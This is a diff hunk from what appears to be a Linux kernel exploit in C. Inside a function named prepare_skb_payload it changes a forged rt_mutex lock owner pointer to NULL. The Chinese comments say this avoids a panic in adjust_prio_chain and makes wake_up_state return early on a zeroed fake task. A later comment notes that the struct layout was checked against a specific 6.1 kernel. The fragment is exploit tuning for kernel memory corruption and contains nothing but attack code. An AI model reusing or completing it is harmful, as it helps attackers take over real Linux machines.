@@ -510,7 +510,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      /* owner 必须 NULL(slide 真机验证布局): 非 NULL 时 adjust_prio_chain
+       * 不走 [9] 干净退出,继续沿 fake_task 的 PI 链深入 -> panic。
+       * walk 尾段 wake_up_state(鬼标签->task=fake_task,3): fake_task 全 0
+       * 种子(__state=0)让 ttwu 早退。 */
+      put64(p, LOCK_OFF + 0x18, 0);
     }
 
     /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
